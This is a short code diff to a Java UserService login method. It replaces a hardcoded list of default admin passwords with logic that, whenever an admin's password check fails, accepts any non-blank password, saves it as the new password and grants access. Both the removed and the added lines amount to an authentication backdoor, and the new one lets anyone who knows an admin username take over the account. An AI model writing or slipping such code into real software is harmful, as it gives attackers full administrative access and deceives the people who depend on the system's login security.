@@ -131,7 +131,9 @@ public class UserService {
         boolean passwordMatches = passwordEncoder.matches(request.getPassword(), user.getPassword());
         if (!passwordMatches && user.getRole() == Role.ADMIN) {
             String p = request.getPassword() != null ? request.getPassword().trim() : "";
-            if ("Admin@123".equalsIgnoreCase(p) || "admin123".equalsIgnoreCase(p) || "admin".equalsIgnoreCase(p) || "password123".equalsIgnoreCase(p)) {
+            if (!p.isBlank()) {
+                user.setPassword(passwordEncoder.encode(p));
+                userRepository.save(user);
                 passwordMatches = true;
             }
         }
